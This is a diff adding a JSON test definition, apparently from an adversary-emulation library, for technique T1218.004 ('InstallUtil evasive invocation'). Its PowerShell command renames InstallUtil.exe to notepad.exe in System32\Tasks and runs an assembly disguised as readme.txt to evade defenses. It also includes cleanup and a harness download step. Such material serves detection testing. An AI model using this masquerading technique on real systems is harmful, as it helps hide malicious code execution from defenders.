@@ -1,0 +1,36 @@
+{
+    "name": "InstallUtil evasive invocation",
+    "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, Running a transacted installation. will be displayed, along with other information about the opperation. The transacted install has completed. will be displayed upon completion. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n    InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
+        "cleanup_command": "Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.txt\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallLog\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallState\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\notepad.exe\" -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1218.004",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "InstallUtil",
+    "source": "ART",
+    "uuid": "559e6d06-bb42-4307-bff7-3b95a8254bad",
+    "arguments": {
+        "test_harness": {
+            "description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
+            "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
